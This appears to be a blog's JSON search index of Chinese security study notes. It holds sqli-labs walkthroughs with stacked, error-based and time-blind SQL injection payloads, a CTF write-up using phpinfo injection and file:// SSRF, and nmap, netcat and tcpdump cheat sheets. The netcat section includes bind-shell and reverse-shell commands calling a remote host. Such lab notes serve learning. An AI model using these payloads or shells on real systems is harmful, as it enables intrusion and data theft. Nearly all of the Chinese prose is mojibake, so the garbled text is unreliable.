å’Œæ³¨å…¥ä¸€æ ·ã€‚ã€‚uname=0%df&#39; union select 1,database() --+&amp;passwd=admin&amp;submit=Submit PAGE-3(Stacked Challenges)38.å±‚æ¬¡åŒ–æŸ¥è¯¢,â€“ä¹Ÿå«åšå †å æ³¨å…¥ mysqli_more_results() å‡½æ•°:æ£€æŸ¥ä¸€ä¸ªå¤šæŸ¥è¯¢æ˜¯å¦æœ‰æ›´å¤šçš„ç»“æœã€‚ mysqli_multi_query()å‡½æ•°:æ‰§è¡Œä¸€ä¸ªæˆ–è€…å¤šä¸ªæŸ¥è¯¢è¯­å¥ mysqli_store_result()å‡½æ•°: è½¬ç§»ä¸Šä¸€æ¬¡æŸ¥è¯¢è¿”å›çš„ç»“æœé›† 39.Stacked Query Injection æ•´æ•°å‹çš„å †å æ³¨å…¥:id=1; insert into users(id,password,username) value(&#39;17&#39;,&#39;a&#39;,&#39;a&#39;) éƒ¨åˆ†æºç  1234567891011121314151617sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;/* execute multi query */if (mysqli_multi_query($con1, $sql))&#123; /* store first result set */ if ($result = mysqli_store_result($con1)) &#123; if($row = mysqli_fetch_row($result)) &#123; echo &#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;; printf(&quot;Your Username is : %s&quot;, $row[1]); echo &quot;&lt;br&gt;&quot;; printf(&quot;Your Password is : %s&quot;, $row[2]); echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; 40.GET-BLIND - based - String - stacked id=1&#39;);insert into users(id,password,username) value(&#39;18&#39;,&#39;b&#39;,&#39;b&#39;)--+ 41.BLIND based - Intiger - Stacked(æ•´æ•°) id=1;insert into user(id,password,usename) value(&#39;19&#39;,&#39;c&#39;,&#39;c&#39;)--+ 42.POST å‹çš„å †å æ³¨å…¥ sqlmap ä¸€æŠŠæ¢­å“ˆ:sqlmap -r /etc/sqlmap/post42.txt -level 3 æ‰‹å·¥æ³¨å…¥ æºç ä¸­å¯¹ username è¿›è¡Œçš„ mysqli_real_escape_string å‡½æ•°çš„è½¬ä¹‰ï¼Œä½†æ˜¯å¯¹ password æ²¡æœ‰ä»»ä½•è¿‡æ»¤æ‰€ä»¥è¿™å‚æ•° password è¿™é‡Œå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œ å †å æ³¨å…¥â€“payload:0&#39;;create table aaa like users--+,æˆåŠŸåœ¨ mysql æ•°æ®åº“ä¸­å»ºç«‹äº†åä¸º aaa çš„è¡¨ 43.POST å‹çš„å †å æ³¨å…¥ ç›¸æ¯” 42 é¢˜ï¼Œé—­åˆç¬¦å·å˜æˆäº†â€™) 44.POST - Error based - String - Stacked -Blind ç›¸æ¯”äº 42 é¢˜ï¼Œ44 æ²¡æœ‰æŠ¥é”™æ˜¾ç¤º login_password=b&#39;;insert into users(id,password,username) value(&#39;20&#39;,&#39;cc&#39;,&#39;cc&#39;)--+ 45.POST - Error based - String - Stacked -Blind ç›¸æ¯” 44 é¢˜ï¼Œé—­åˆç¬¦å·å˜æˆäº†â€™) payload:login_password=b&#39;);insert into users(id,password,username) value(&#39;20&#39;,&#39;cc&#39;,&#39;cc&#39;)--+ 46.ORDER BY-Error-Numeric å¯¹äº sort å‚æ•°çš„åŸç†æœ‰ç‚¹é™Œç”Ÿï¼Œè´´å‡ºæºç  12345678910$id=$_GET[&#x27;sort&#x27;];if(isset($id)) &#123; //logging the connection parameters to a file for analysis. $fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;); fwrite($fp,&#x27;SORT:&#x27;.$id.&quot;\\n&quot;); fclose($fp); $sql = &quot;SELECT * FROM users ORDER BY $id&quot;; $result = mysqli_query($con1, $sql); å½“è¾“å…¥ sort=4 æ—¶ï¼ŒæŠ¥é”™æ˜¾ç¤ºï¼Œæ²¡æœ‰ç›¸åº”çš„å­—æ®µï¼Œå­˜åœ¨æŠ¥é”™æ³¨å…¥ payload:sort=4 and updatexml(1,concat(0x7e,(select version()),0x7e),1) 47.ORDER BY Clause-Error-Single quote ç›¸æ¯”äº 46ï¼Œè¿™é‡Œé€šè¿‡â€™æ¥é—­åˆ åŸºäº procedure analyse æ³¨å…¥sort=1&#39;procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)--+ åŸºäº update å° xml çš„æ³¨å…¥sort=1&#39; and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+ 48.ORDER BY Clause Blind based å¸ƒå°”ç›²æ³¨ if(ascii(left(database,1))=115) 49.ORDER BY Clause Blind based æ—¶é—´ç›²æ³¨:sort=1 and if(left(database(),1)=&#39;s&#39;,sleep(1),1)--+å¾ˆå¥‡æ€ªï¼Œæ—¶é—´å»¶è¿Ÿæ³¨å…¥ä¼šä¸€ç›´å»¶è¿Ÿè®¿é—®ã€‚ã€‚ã€‚ã€‚ 50.GET - Error based - ORDER BY CLAUSE -num â€¦ æŠ¥é”™æ˜¾ç¤º:sort=4 and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+ 51.GET - Error based - ORDER BY CLAUSE-Stri â€¦ ç›¸æ¯” 50 é¢˜ï¼Œ&#39;å·é—­åˆ æŠ¥é”™æ³¨å…¥:sort=1&#39; and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+ 52.GET - Blind based - ORDER BY CLAUSE -num â€¦ æ²¡æœ‰é”™è¯¯å›æ˜¾ æ—¶é—´å»¶è¿Ÿæ³¨å…¥:1 and if(left(database(),1)=&#39;x&#39;,sleep(4),0)--+ å¸ƒå°”æ³¨å…¥:1 and left(database(),1)=&#39;x&#39;--+1 and ascii(substr(database(),1,1))=115--+ æºç ä¸­ä½¿ç”¨äº† mysqli_multi_query()å‡½æ•°:å¯èƒ½å­˜åœ¨å †å æ³¨å…¥payload:sort=2;create table ff like users--+æˆåŠŸåˆ›å»º 53.GET - GET - Blind based - ORDER BY CLAUS-Stri â€¦ ä¸€ä¸ªé—®é¢˜:ä¸ºä»€ä¹ˆ sort è®¾ç½®ä¸ºä»»ä½•æ•´æ•°ï¼Œé¡µé¢çš„è¡¨æ ¼æ²¡æœ‰å˜åŒ–ï¼Œä¸”æ­£å¸¸å›æ˜¾ç¬¬ä¸€é¡µå‘¢ï¼Ÿè¿™é‡Œå¯ä»¥çœ‹æˆåªæœ‰æ­£ç¡®å’Œé”™è¯¯ï¼Œæ‰€ä»¥è¿™é“é¢˜åšæ³•åŸºæœ¬å°±æ˜¯ç›²æ³¨äº† æ—¶é—´å»¶è¿Ÿæ³¨å…¥:sort=2&#39; and if(length(database())=1,0,sleep(5))--+ 54.GET-challenge-Union-10 queries allowed-Variation 1 åŸºæœ¬æ³¨å…¥æ­¥éª¤å³å¯ 55.GET-challenge-Union-14 queries allowed-Variation 2 é—­åˆå°è¯•â€”æœ€åå‘ç°æ˜¯ï¼‰é—­åˆç„¶åå°±æ˜¯åŸºæœ¬çš„æ³¨å…¥æ­¥éª¤ 56.GET-challenge-Union-14 queries allowed-Variation 3 åˆšå¼€å§‹å°è¯•â€“1&quot;--+å‘ç°èƒ½å¤Ÿæ­£ç¡®å›æ˜¾ï¼Œä½†æ˜¯ union è¯­å¥ä½¿ç”¨ï¼Œä¸èƒ½æ˜¾ç¤ºã€‚é˜…è¯»æºç æ‰çŸ¥é“æ˜¯&#39;)é—­åˆã€‚ã€‚é‚£ä¹ˆä¸ºä»€ä¹ˆ1&quot;--+ä¼šæ­£ç¡®å›æ˜¾å‘¢ï¼Ÿ PAGE-4(Challenges)57. &quot;é—­åˆæ–¹å¼ï¼Œç„¶åå°±æ˜¯åŸºæœ¬æ³¨å…¥æ­¥éª¤ 58.GET-challenge-Double Query-5 queries allowed-Variation 1 åŒæ³¨å…¥æ²¡æœ‰ç”¨åˆ°ï¼Œé€‰æ‹©äº†æŠ¥é”™æ³¨å…¥ åŒæ³¨å…¥(åŸºäº floor)ï¼š 59.GET-challenge-Double Query-5 queries allowed-Variation 2 æ²¡æœ‰é—­åˆç¬¦å·çš„æŠ¥é”™æ³¨å…¥ 60.GET-challenge-Double Query-5 queries allowed-Variation 3 &quot;)é—­åˆæ–¹å¼ã€‚æŠ¥é”™æˆ–è€…åŒæ³¨å…¥æŠ¥é”™å³å¯ 61.GET-challenge-Double Query-5 queries allowed-Variation 4 &#39;))çš„é—­åˆæ–¹å¼ï¼ŒæŠ¥é”™æˆ–è€…åŒæ³¨å…¥æŠ¥é”™å³å¯ 62. GET-challenge-Blind- 130 queries allowed -variation 1 ä»¥åçš„å‡ é¢˜éƒ½æ˜¯ç›²æ³¨ï¼Œéœ€è¦ä½¿ç”¨è„šæœ¬è‡ªåŠ¨çˆ†ç ´æ³¨å…¥ã€‚","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://example.com/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"sql","slug":"sql","permalink":"http://example.com/tags/sql/"}]},{"title":"çº¢å¸½æ¯","slug":"CTFæ¯”èµ›/çº¢å¸½æ¯","date":"2021-03-06T14:06:06.000Z","updated":"2021-06-06T07:51:58.532Z","comments":true,"path":"2021/03/06/CTFæ¯”èµ›/çº¢å¸½æ¯/","link":"","permalink":"http://example.com/2021/03/06/CTF%E6%AF%94%E8%B5%9B/%E7%BA%A2%E5%B8%BD%E6%9D%AF/","excerpt":"","text":"find_it çŸ¥è¯†ç‚¹ vim å¤‡ä»½æ–‡ä»¶ çŸ­æ ‡ç­¾ robots.txt æ–‡ä»¶æç¤ºæœ‰ 1ndexx.phpï¼Œä½†æ˜¯è®¿é—®ä¸äº†å­˜åœ¨ vim å¤‡ä»½æ–‡ä»¶ï¼šhttp://eci-2zefc95c45rhg0wuefre.cloudeci1.ichunqiu.com/.1ndexx.php.swp å¾—åˆ°æºç ï¼Œ/index.php?code=&lt;?=phpinfo();?&gt; å‘ç° flag åœ¨ phpinfo()çš„å…¨å±€å˜é‡ä¸­ framework çŸ¥è¯†ç‚¹ Yii æ¡†æ¶ ååºåˆ—åŒ– www.zip çš„åˆ°æ¡†æ¶çš„æºç ï¼Œæœ¬åœ°æ­å»ºï¼Œè·å–æ¡†æ¶çš„ç‰ˆæœ¬å‚è€ƒYii ååºåˆ—æ¼æ´ WebsiteManger çŸ¥è¯†ç‚¹ sql ç›²æ³¨ ssrf sql ç›²æ³¨å¾—åˆ°å¯†ç ï¼Œç™»å½•åè¿›å…¥ curl.php æ–‡ä»¶ä¸­ï¼Œç›´æ¥file:///flagå¾—åˆ° flag ezlight çŸ¥è¯†ç‚¹ LightCMS æ¡†æ¶ Phar ååºåˆ—","categories":[{"name":"CTFæ¯”èµ›","slug":"CTFæ¯”èµ›","permalink":"http://example.com/categories/CTF%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"CTFæ¯”èµ›","slug":"CTFæ¯”èµ›","permalink":"http://example.com/tags/CTF%E6%AF%94%E8%B5%9B/"}]},{"title":"Nmap","slug":"å·¥å…·ä½¿ç”¨/nmap","date":"2021-03-01T12:53:43.000Z","updated":"2021-03-22T15:56:31.231Z","comments":true,"path":"2021/03/01/å·¥å…·ä½¿ç”¨/nmap/","link":"","permalink":"http://example.com/2021/03/01/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/nmap/","excerpt":"","text":"nmap HOST 123456-iL #è¯»å–IPåˆ—è¡¨æ–‡ä»¶-iR #éšæœºé€‰æ‹©ç›®æ ‡--exclude &lt;host&gt; #é™¤å¤–ä¸€äº›IP-sL #å­ç½‘æ©ç è®¡ç®—ï¼Œæ˜¾ç¤ºè¦æ‰«çš„IP-n #ä¸åšdnsè§£æ--dns-server #æŒ‡å®šdns-serverï¼Œå¯ä»¥è®¿é—®å›½å¤–çš„ PORT 12345678-sS:åŠè¿æ¥æ‰«æï¼Œå‘é€SYNæ•°æ®åŒ…ï¼Œä¸ä¼šåœ¨å¯¹æ–¹ä¸»æœºæ—¥å¿—ä¸­è¿›è¡Œè®°å½•-sT #TCPæ‰«æ-sU #UDPæ‰«æ-sA:åŠè¿æ¥æ‰«æï¼Œå‘é€ACKæ•°æ®åŒ…ï¼Œä¸ä¼šåœ¨å¯¹æ–¹ä¸»æœºæ—¥å¿—ä¸­è¿›è¡Œè®°å½•--scanflags #æŒ‡å®šflags-sI #åƒµå°¸æ‰«æ-sY #SCTPåè®®-sO #IPåè®® PORT SPECIFICATION 123-p U:&lt;port&gt; &lt;IP&gt;#æŒ‡å®šç«¯å£ï¼ŒUDPæ‰«æ-F:Fast mode(å¿«é€Ÿæ¨¡å¼)ï¼Œä»…æ‰«æå‰100ä¸ªç«¯å£-r #æŒ‰é¡ºåºæ‰«æ SERVICE 12-sV:æ‰«æå¼€æ”¾çš„ç«¯å£æ‰€å¯¹åº”æœåŠ¡çš„ç‰ˆæœ¬--version-intensity #æŒ‡å®šæ‰«æçš„æ·±å…¥ç¨‹åº¦ OS-O:æ‰«æç›®æ ‡ä¸»æœºçš„æ“ä½œç³»ç»Ÿ","categories":[{"name":"å·¥å…·ä½¿ç”¨","slug":"å·¥å…·ä½¿ç”¨","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}],"tags":[{"name":"å·¥å…·ä½¿ç”¨","slug":"å·¥å…·ä½¿ç”¨","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}]},{"title":"Netcat","slug":"å·¥å…·ä½¿ç”¨/netcat","date":"2021-03-01T12:53:43.000Z","updated":"2021-03-22T15:47:51.458Z","comments":true,"path":"2021/03/01/å·¥å…·ä½¿ç”¨/netcat/","link":"","permalink":"http://example.com/2021/03/01/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/netcat/","excerpt":"","text":"nc ä½¿ç”¨:é€è¿‡ä½¿ç”¨ TCP æˆ– UDP åè®®çš„ç½‘ç»œè¿æ¥å»è¯»å†™æ•°æ® -d åå°æ¨¡å¼-e prog ç¨‹åºé‡å®šå‘ï¼Œä¸€æ—¦è¿æ¥ï¼Œå°±æ‰§è¡Œ [å±é™©!!]-g gateway source-routing hop point[s], up to 8-G num source-routing pointer: 4, 8, 12, â€¦-h å¸®åŠ©ä¿¡æ¯-i secs å»¶æ—¶çš„é—´éš”-l ç›‘å¬æ¨¡å¼ï¼Œç”¨äºå…¥ç«™è¿æ¥-L è¿æ¥å…³é—­å,ä»ç„¶ç»§ç»­ç›‘å¬-n æŒ‡å®šæ•°å­—çš„ IP åœ°å€ï¼Œä¸èƒ½ç”¨ hostname-o file è®°å½• 16 è¿›åˆ¶çš„ä¼ è¾“-p port æœ¬åœ°ç«¯å£å·-r éšæœºæœ¬åœ°åŠè¿œç¨‹ç«¯å£-s addr æœ¬åœ°æºåœ°å€-t ä½¿ç”¨ TELNET äº¤äº’æ–¹å¼-u UDP æ¨¡å¼-v è¯¦ç»†è¾“å‡ºâ€“ç”¨ä¸¤ä¸ª-v å¯å¾—åˆ°æ›´è¯¦ç»†çš„å†…å®¹-w secs timeout çš„æ—¶é—´-z å°†è¾“å…¥è¾“å‡ºå…³æ‰â€“ç”¨äºæ‰«ææ—¶ ç«¯å£çš„è¡¨ç¤ºæ–¹æ³•å¯å†™ä¸º M-N çš„èŒƒå›´æ ¼å¼ã€‚ åŸºæœ¬ç”¨æ³•ï¼š å¤§æ¦‚æœ‰ä»¥ä¸‹å‡ ç§ç”¨æ³•ï¼š 1)è¿æ¥åˆ° REMOTE ä¸»æœºï¼Œä¾‹å­ï¼šæ ¼å¼ï¼šnc -nvv 192.168.x.x 80è®²è§£ï¼šè¿åˆ° 192.168.x.x çš„ TCP80 ç«¯å£ 2)ç›‘å¬ LOCAL ä¸»æœºï¼Œä¾‹å­ï¼šæ ¼å¼ï¼šnc -l -p 80è®²è§£ï¼šç›‘å¬æœ¬æœºçš„ TCP80 ç«¯å£ 3)æ‰«æè¿œç¨‹ä¸»æœºï¼Œä¾‹å­ï¼šæ ¼å¼ï¼šnc -nvv -w2 -z 192.168.x.x 80-445è®²è§£ï¼šæ‰«æ 192.168.x.x çš„ TCP80 åˆ° TCP445 çš„æ‰€æœ‰ç«¯å£ 4)REMOTE ä¸»æœºç»‘å®š SHELLï¼Œä¾‹å­ï¼šæ ¼å¼ï¼šnc -l -p 5354 -t -e c:winntsystem32cmd.exeè®²è§£ï¼šç»‘å®š REMOTE ä¸»æœºçš„ CMDSHELL åœ¨ REMOTE ä¸»æœºçš„ TCP5354 ç«¯å£ 5)REMOTE ä¸»æœºç»‘å®š SHELL å¹¶åå‘è¿æ¥ï¼Œä¾‹å­ï¼šæ ¼å¼ï¼šnc -t -e c:winntsystem32cmd.exe 192.168.x.x 5354è®²è§£ï¼šç»‘å®š REMOTE ä¸»æœºçš„ CMDSHELL å¹¶åå‘è¿æ¥åˆ° 192.168.x.x çš„ TCP5354 ç«¯å£ ä»¥ä¸Šä¸ºæœ€åŸºæœ¬çš„å‡ ç§ç”¨æ³•ï¼ˆå…¶å® NC çš„ç”¨æ³•è¿˜æœ‰å¾ˆå¤šï¼Œå½“é…åˆç®¡é“å‘½ä»¤â€œ|â€ä¸é‡å®šå‘å‘½ä»¤â€œ&lt;â€ã€â€œ&gt;â€ç­‰ç­‰å‘½ä»¤åŠŸèƒ½æ›´å¼ºå¤§â€¦â€¦ï¼‰ã€‚ é«˜çº§ç”¨æ³•ï¼š 6)ä½œæ”»å‡»ç¨‹åºç”¨ï¼Œä¾‹å­ï¼šæ ¼å¼ 1ï¼štype.exe c:exploit.txt|nc -nvv 192.168.x.x 80æ ¼å¼ 2ï¼šnc -nvv 192.168.x.x 80 &lt; c:exploit.txtè®²è§£ï¼šè¿æ¥åˆ° 192.168.x.x çš„ 80 ç«¯å£ï¼Œå¹¶åœ¨å…¶ç®¡é“ä¸­å‘é€ c:exploit.txt çš„å†…å®¹(ä¸¤ç§æ ¼å¼ç¡®æœ‰ç›¸åŒçš„æ•ˆæœï¼ŒçœŸæ˜¯æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™:P) é™„ï¼šc:exploit.txt ä¸º shellcode ç­‰ 7)ä½œèœœç½ç”¨[1]ï¼Œä¾‹å­ï¼šæ ¼å¼ï¼šnc -L -p 80è®²è§£ï¼šä½¿ç”¨-L(æ³¨æ„ L æ˜¯å¤§å†™)å¯ä»¥ä¸åœåœ°ç›‘å¬æŸä¸€ä¸ªç«¯å£ï¼Œç›´åˆ° ctrl+c ä¸ºæ­¢. 8)ä½œèœœç½ç”¨[2]ï¼Œä¾‹å­ï¼šæ ¼å¼ï¼šnc -L -p 80 &gt; c:log.txtè®²è§£ï¼šä½¿ç”¨-L å¯ä»¥ä¸åœåœ°ç›‘å¬æŸä¸€ä¸ªç«¯å£ï¼Œç›´åˆ° ctrl+c ä¸ºæ­¢ï¼ŒåŒæ—¶æŠŠç»“æœè¾“å‡ºåˆ° c:log.txt ä¸­ï¼Œå¦‚æœæŠŠâ€˜&gt;â€™æ”¹ä¸ºâ€˜&gt;&gt;â€™å³å¯ä»¥è¿½åŠ æ—¥å¿—ã€‚ é™„ï¼šc:log.txt ä¸ºæ—¥å¿—ç­‰ 9)ä½œèœœç½ç”¨[3]ï¼Œä¾‹å­ï¼šæ ¼å¼ 1ï¼šnc -L -p 80 &lt; c:honeypot.txtæ ¼å¼ 2ï¼štype.exe c:honeypot.txt|nc -L -p 80è®²è§£ï¼šä½¿ç”¨-L å¯ä»¥ä¸åœåœ°ç›‘å¬æŸä¸€ä¸ªç«¯å£ï¼Œç›´åˆ° ctrl+c ä¸ºæ­¢ï¼Œå¹¶æŠŠ c:honeypot.txt çš„å†…å®¹â€˜é€â€™å…¥å…¶ç®¡é“ä¸­ã€‚ Linux kali å¼€å¯ç«¯å£ã€å…³é—­é˜²ç«å¢™æ–¹æ³• nc -lp 23:æ‰“å¼€ 23 ç«¯å£ï¼Œä½†æ˜¯éœ€è¦ç›‘å¬ netstat -an | grep 23:æŸ¥è¯¢ 23 ç«¯å£æ˜¯å¦æ‰“å¼€ telnet:æŸ¥çœ‹æŸä¸ªç«¯å£æ˜¯å¦å¯è®¿é—® netstat -antup |grep 9998:æŸ¥çœ‹ç›‘å¬","categories":[{"name":"å·¥å…·ä½¿ç”¨","slug":"å·¥å…·ä½¿ç”¨","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}],"tags":[{"name":"å·¥å…·ä½¿ç”¨","slug":"å·¥å…·ä½¿ç”¨","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}]},{"title":"wireshark-tcpdump","slug":"å·¥å…·ä½¿ç”¨/wireshark-tcpdump","date":"2021-03-01T12:53:43.000Z","updated":"2021-03-22T15:57:25.788Z","comments":true,"path":"2021/03/01/å·¥å…·ä½¿ç”¨/wireshark-tcpdump/","link":"","permalink":"http://example.com/2021/03/01/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/wireshark-tcpdump/","excerpt":"","text":"ä¸€. wireshark ä¸»ç•Œé¢ä»‹ç» é€‰æ‹©ç½‘å¡åè¿›å…¥æ‹¦æˆªç•Œé¢ã€‚è¿™é‡Œ 1 å·çª—å£è¡¨ç¤º wireshark æ•è·åˆ°çš„æ‰€æœ‰æ•°æ®åŒ…çš„åˆ—è¡¨ï¼Œæ³¨æ„æœ€åä¸€åˆ— info æ˜¯ç»„ç»‡è¯´æ˜åˆ—ï¼Œä¸ä¸€å®šæ˜¯è¯¥æ•°æ®åŒ…ä¸­çš„åŸå§‹å†…å®¹ï¼›2 å·çª—å£æ˜¯ 1 å·çª—å£ä¸­é€‰å®šçš„æ•°æ®åŒ…çš„åˆ†å±‚åè®®å±•ç¤ºï¼›3 å·çª—å£è¡¨ç¤º 1 å·çª—å£ä¸­é€‰å®šçš„æ•°æ®åŒ…çš„åŸå§‹æ•°æ®ï¼Œå…¶ä¸­å·¦ä¾§åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œå³ä¾§ ascii ç è¡¨ç¤ºã€‚åœ¨ 2 å·çª—å£é€‰ä¸­æŸå±‚ï¼Œ3 å·çª—å£å¯¹åº”ä½ç½®ä¼šé«˜äº®ã€‚ åœ¨æˆ‘ä»¬æƒ³æŠ“å–æ—¶å¯¹æ•°æ®åŒ…è¿›è¡Œè¿‡æ»¤ï¼Œå°±é€‰æ‹©â€”â€”æ•è·â€”â€”é€‰é¡¹ï¼Œç„¶åé€‰æ‹©æŠ“å–çš„ç½‘å¡ï¼Œä¸‹é¢å†é€‰æ‹©è¿‡æ»¤å™¨ã€‚è®¾ç½®å¥½åå°±å¯ä»¥å¼€å§‹æŠ“åŒ… æŠ“å–åçš„è¿‡æ»¤ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éƒ½æ˜¯æŠ“å–å®Œæ•°æ®åè¿›è¡Œè¿‡æ»¤çš„ï¼Œåœ¨ä¸Šæ–¹è¾“å…¥ç›¸åº”çš„è¯­æ³•ï¼Œå¯¹æ•°æ®åŒ…è¿›è¡Œç­›é€‰ã€‚ è¿‡æ»¤çš„è¯­æ³•åˆæ¬¡ç›¸è¯†ï¼Œéƒ½ä¼šè¢«è¿™ä¸ªè¿‡æ»¤çš„è¯­æ³•ææ‡µé€¼ã€‚è¿™é‡Œæ€»ç»“ä¸€ä¸‹æ ¼å¼ï¼šä¸€æ¡åŸºæœ¬çš„è¡¨è¾¾å¼ç”±è¿‡æ»¤é¡¹ã€è¿‡æ»¤å…³ç³»ã€è¿‡æ»¤å€¼ç»„æˆã€‚è€Œå…¶ä¸­éš¾ç‚¹å°±åœ¨äºè¿‡æ»¤é¡¹ï¼Œè¿‡æ»¤é¡¹æ¨¡å¼ä¸ºï¼šåè®®+.+åè®®å­—æ®µ ã€‚æ¯”å¦‚ï¼šip.addr==192.168.10.10 å…¶ä¸­ ip ä¸ºåè®®ï¼Œaddr ä¸ºåè®®å­—æ®µï¼Œ==ä¸ºè¿‡æ»¤å…³ç³»ï¼Œ192.168.10.10 ä¸ºè¿‡æ»¤å€¼ã€‚ ç€è‰²è§„åˆ™ å¦å¤–æˆ‘ä»¬æ•è·çš„æ•°æ®åŒ…éƒ½ä¼šå‘ˆç°å‡ºä¸åŒçš„é¢œè‰²ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆçŸ¥é“ä»£è¡¨ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿå¯ä»¥é€šè¿‡è§†å›¾â€”â€”ç€è‰²è§„åˆ™æ¥æŸ¥çœ‹ æ•°æ®åŒ…çš„å¤§è‡´ç»“æ„ 12345ç¬¬ä¸€è¡Œï¼šæ•°æ®åŒ…æ•´ä½“æ¦‚è¿°ï¼Œç¬¬äºŒè¡Œï¼šé“¾è·¯å±‚è¯¦ç»†ä¿¡æ¯ï¼Œä¸»è¦çš„æ˜¯åŒæ–¹çš„macåœ°å€ç¬¬ä¸‰è¡Œï¼šç½‘ç»œå±‚è¯¦ç»†ä¿¡æ¯ï¼Œä¸»è¦çš„æ˜¯åŒæ–¹çš„IPåœ°å€ç¬¬å››è¡Œï¼šä¼ è¾“å±‚çš„è¯¦ç»†ä¿¡æ¯ï¼Œä¸»è¦çš„æ˜¯åŒæ–¹çš„ç«¯å£å·ã€‚ç¬¬äº”è¡Œï¼šåŸŸåç³»ç»Ÿç›¸å…³ä¿¡æ¯ æ•°æ®æµçš„è¿½è¸ªæˆ‘ä»¬çš„ä¸€ä¸ªå®Œæ•´çš„æ•°æ®æµä¸€èˆ¬éƒ½æ˜¯ç”±å¾ˆå¤šä¸ªåŒ…ç»„æˆçš„ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬æƒ³æŸ¥çœ‹æŸæ¡æ•°æ®åŒ…å¯¹äºçš„æ•°æ®æµçš„è¯ã€‚å¯ä»¥é€‰ä¸­æ•°æ®ï¼Œå³é”®é€‰æ‹©è¿½è¸ªæµã€‚é‡Œé¢å°±ä¼šæœ‰ tcp æµã€udp æµã€ssl æµã€http æµã€‚æ•°æ®åŒ…å±äºå“ªç§æµå°±é€‰æ‹©å¯¹åº”çš„æµã€‚ æ•°æ®åŒ…çš„ç»Ÿè®¡åˆ†æåœ¨ç»Ÿè®¡ä¸€æ ä¸­ï¼Œå¯ä»¥å¯¹æŠ“å–çš„æ•°æ®åŒ…è¿›ä¸€æ­¥çš„åˆ†æã€‚æ¯”å¦‚æ•°æ®åŒ…çš„å±æ€§ã€å·²è§£æçš„åœ°å€ã€åè®®åˆ†çº§ç­‰ã€‚ å®‰å…¨æ–¹é¢çš„å°æŠ€å·§ 123456å¤§é‡404è¯·æ±‚â€”â€”&gt; ç›®å½•æ‰«æå¤§é‡ select....from å…³é”®å­—è¯·æ±‚â€”â€”&gt; SQLæ³¨å…¥è¿ç»­ä¸€ä¸ªipçš„å¤šç«¯å£è¯·æ±‚æˆ–å¤šä¸ªipçš„å‡ ä¸ªç›¸åŒç«¯å£è¯·æ±‚â€”â€”&gt; ç«¯å£æ‰«æé»‘å®¢çˆ†ç ´è´¦æˆ·å’Œå¯†ç ï¼Œåˆ™æ˜¯postè¯·æ±‚ http.request.method&#x3D;&#x3D;POSTé»‘å®¢ä¿®æ”¹æ–‡ä»¶ï¼Œ ip.addr&#x3D;&#x3D;219.239.105.18 and http.request.url matches &quot;edit|upload|modify&quot;å¦‚æœæ˜¯ç”¨èœåˆ€è¿æ¥çš„åŒ…ï¼Œåˆ™æ˜¯postè¯·æ±‚ ip.addr&#x3D;&#x3D;219.239.105.18 and http.request.method&#x3D;&#x3D;POST å®ä¾‹ï¼šwireshark å®ä¾‹ äºŒã€tcpdumpï¼šå‘½ä»¤è¡Œçš„æŠ“åŒ…å·¥å…· æŠ“åŒ… é»˜è®¤ä¹‹æŠ“åŒ… 68 ä¸ªå­—èŠ‚ tcpdump -i eth0 -s 0 -w file.pcap å¦‚æœæƒ³è¦æŠ“æŸä¸€ç«¯å£çš„åŒ…å¯ä»¥ä½¿ç”¨ Tcpdump -i eth0 port 22 è¯»å–æŠ“åŒ…æ–‡ä»¶ Tcpdump -r file.pcap * TCPDUMPâ€”â€”ç­›é€‰ 12345tcpdump -n -r http.cap | wak&#39;&#123;print$3&#125;&#39;|sort -utcpdump -n src host 145.254.160.237 -r http.captcpdump -n dst host 145.254.160.237 -r http.captcpdump -n port 53 -r http.captcpdump -n -X port 80 -r http.cap -X å‘Šè¯‰ tcpdump å‘½ä»¤ï¼Œéœ€è¦æŠŠåè®®å¤´å’ŒåŒ…å†…å®¹éƒ½åŸåŸæœ¬æœ¬çš„æ˜¾ç¤ºå‡ºæ¥ï¼ˆtcpdump ä¼šä»¥ 16 è¿›åˆ¶å’Œ ASCII çš„å½¢å¼æ˜¾ç¤ºï¼‰ï¼Œè¿™åœ¨è¿›è¡Œåè®®åˆ†ææ—¶æ˜¯ç»å¯¹çš„åˆ©å™¨ã€‚ -c æ˜¯ Count çš„å«ä¹‰ï¼Œè¿™è®¾ç½®äº†æˆ‘ä»¬å¸Œæœ› tcpdump å¸®æˆ‘ä»¬æŠ“å‡ ä¸ªåŒ… -n ä¸æŠŠç½‘ç»œåœ°å€è½¬æ¢æˆåå­— å…³äºç±»å‹çš„å…³é”®å­—ï¼Œä¸»è¦åŒ…æ‹¬ hostï¼Œnetï¼Œport, ä¾‹å¦‚ host 210.45.114.211ï¼ŒæŒ‡å®šä¸»æœº 210.45.114.211ï¼Œnet 210.11.0.0 æŒ‡æ˜ 210.11.0.0 æ˜¯ä¸€ä¸ªç½‘ç»œåœ°å€ï¼Œ* port 21 æŒ‡æ˜ç«¯å£å·æ˜¯ 21ã€‚ å…³äºä¼ è¾“æ–¹å‘çš„å…³é”®å­—ï¼Œä¸»è¦åŒ…æ‹¬ 